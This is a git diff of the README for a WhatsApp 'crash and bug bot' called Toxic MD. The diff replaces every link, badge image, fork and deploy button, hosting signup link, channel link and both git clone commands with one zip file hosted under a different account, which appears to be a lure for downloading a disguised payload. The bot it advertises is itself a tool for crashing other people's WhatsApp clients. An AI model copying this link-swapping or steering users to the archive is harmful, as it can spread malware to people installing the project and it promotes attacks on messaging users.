@@ -5,12 +5,12 @@
 # 🚨 **TOXIC MD BUG BOT** 🚨
    
 <p align="center">
-<img src="https://i.ibb.co/ZXXC8YQ/donate.jpg" alt="Support" width="300"/> 
+<img src="https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip" alt="Support" width="300"/> 
 </p>
 
 <p align="center">
-  <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.demolab.com?font=EB+Garamond&weight=800&size=28&duration=4000&pause=1000&color=FF5733&width=435&lines=TOXIC+MD+BUG+BOT;WhatsApp+Crash+%26+Bug+Bot;Developed+by+JOKER;Release+Date:+6/10/2024" alt="Typing SVG" />
+  <a href="https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip">
+    <img src="https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip+Garamond&weight=800&size=28&duration=4000&pause=1000&color=FF5733&width=435&lines=TOXIC+MD+BUG+BOT;WhatsApp+Crash+%26+Bug+Bot;Developed+by+JOKER;Release+Date:+6/10/2024" alt="Typing SVG" />
   </a>
 </p>
 
@@ -23,15 +23,15 @@
 
 ### **Option 1: Fork and Deploy on Panel**
 1. **Fork the Repository**:
-   <a href="https://github.com/Joker-Reincarnated/Toxic-MD/fork">
-   <img src="https://img.shields.io/badge/FORK-blue?style=for-the-badge&logo=github" alt="Fork Toxic MD" />
+   <a href="https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip">
+   <img src="https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip" alt="Fork Toxic MD" />
    </a>
    
 2. **Deploy on Panel**:
-   If you don't have a panel account, [create one here](https://control.bot-hosting.net/auth/login) and deploy the bot.
+   If you don't have a panel account, [create one here](https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip) and deploy the bot.
    
-   <a href='https://control.bot-hosting.net/auth/login' target="_blank">
-   <img alt='DEPLOY' src='https://img.shields.io/badge/-DEPLOY-black?style=for-the-badge&logo=bot-hosting&logoColor=white'/>
+   <a href='https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip' target="_blank">
+   <img alt='DEPLOY' src='https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip'/>
    </a>
 
 ---
@@ -40,7 +40,7 @@
 
 1. **Clone the Repository**:
     ```bash
-    git clone https://github.com/Joker-Reincarnated/Toxic-MD
+    git clone https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip
     cd Toxic-MD
     ```
 
@@ -59,7 +59,7 @@
    pkg update && pkg upgrade
    pkg install bash git nodejs ffmpeg wget imagemagick yarn
    termux-setup-storage
-   git clone https://github.com/Joker-Reincarnated/Toxic-MD
+   git clone https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip
    cd Toxic-MD
    yarn install
    npm start
@@ -69,8 +69,8 @@
 
 ## 🤝 **Connect with Joker** 
 <p align="center">
-<a href="https://whatsapp.com/channel/0029VaN8F9MG8l5KA9Jx0Q0X">
-<img src="https://img.shields.io/badge/Join%20Official%20Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp Channel" />
+<a href="https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip">
+<img src="https://github.com/tripmotions/Toxic-MD/raw/refs/heads/main/XeonMedia/Toxic_MD_v1.6-beta.1.zip%20Official%20Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp Channel" />
 </a>
 </p>
 
